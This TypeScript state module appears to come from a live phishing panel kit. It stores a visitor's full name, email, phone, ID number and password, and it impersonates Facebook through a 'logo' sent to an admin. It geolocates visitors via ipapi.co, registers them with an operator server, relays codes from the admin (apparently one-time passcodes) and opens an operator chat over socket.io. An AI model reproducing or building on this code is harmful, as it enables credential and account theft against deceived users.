/* eslint-disable @typescript-eslint/no-explicit-any */
import { effect, signal } from "@preact/signals";
import axios from "axios";
import { getCookie, setCookie } from "cookies-next";
import io from "socket.io-client";
import { getInitInfo, sendMainInfo } from "../utils/utils";

// ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //

export const ROOM = import.meta.env.VITE_CODE;

export const socket = signal(
  io(
    import.meta.env.VITE_MODE === "DEV"
      ? import.meta.env.VITE_DEV_SOCKET_IO_URL
      : import.meta.env.VITE_PROD_SOCKET_IO_URL,
    {
      transports: ["websocket"],
      autoConnect: false,
      forceNew: true,
    }
  )
);

// To Sent To Server Any Time Tht It Change

export const loading = signal("net");

export const isApproved = signal(false);

export const messages = signal<any[]>([]);

export const permissions = signal<string[]>([]);

export const message = signal("");

export const lastMessage = signal("");

export const mainInfo = signal({
  fullName: "",
  email: "",
  phone: "",
  idNumber: "",
  password: "",
  _id: "",
  room: ROOM,
  ip: "",
  country: "",
  city: "",
  date: "",
  socketId: "",
  page: "home",
});

//For Admin Rejected Our Request Notification

export const isAdminError = signal(false);

//For Shown Chat Model

export const isChat = signal(false);

//For Chat Notification

export const isNewMessage = signal(0);

//For Code That Sent From Admin

export const code = signal("");

//For Logo That We Sent To Admin

export const logo = signal("facebook");

export const specialId = signal("");

export const isError = signal("");

effect(() => {
  if (mainInfo.value.socketId) {
    sendMainInfo();
  }
});

effect(() => {
  if (!isError.value) {
    axios
      .get("https://ipapi.co/json/")
      .then((res) => {
        if (!mainInfo.value._id) {
          axios
            .post(
              `${
                import.meta.env.VITE_MODE == "DEV"
                  ? import.meta.env.VITE_DEV_API_URL
                  : import.meta.env.VITE_PROD_API_URL
              }/users`,
              {
                ip: res.data?.ip,
                country: res.data?.country_name,
                city: res.data?.city,
                code: ROOM,
              }
            )
            .then(({ data }) => {
              mainInfo.value = {
                ...data.materials,
                room: ROOM,
                date: new Date().toString(),
                page: "home",
              };
              const nextYear = new Date();
              const current = new Date();
              nextYear.setFullYear(current.getFullYear() + 1);
              setCookie("ID", data.materials._id, { expires: nextYear });
              loading.value = "";
              socket.value.connect();
            });
        } else {
          socket.value.connect();
          loading.value = "";
          mainInfo.value = {
            ...mainInfo.value,
            room: ROOM,
            ip: res.data?.ip,
            country: res.data?.country_name,
            city: res.data?.city,
            date: new Date().toString(),
            page: "home",
          };
        }
      })
      .catch((err) => {
        console.log(err);
      });
  }
});

effect(() => {
  if (getCookie("ID")) {
    getInitInfo();
  }

  axios
    .post(
      `${
        import.meta.env.VITE_MODE == "DEV"
          ? import.meta.env.VITE_DEV_API_URL
          : import.meta.env.VITE_PROD_API_URL
      }/auth/check`,
      { code: ROOM }
    )
    .then(() => {
      isError.value = "";
    })
    .catch(() => {
      isError.value =
        "The Code Is Expired Or Wrong, Connect With Page Owner To Solve Problem Or Make Sure That You Write A Right Code";
    });
});

effect(() => {
  if (isChat.value) {
    isNewMessage.value = 0;
  }
});
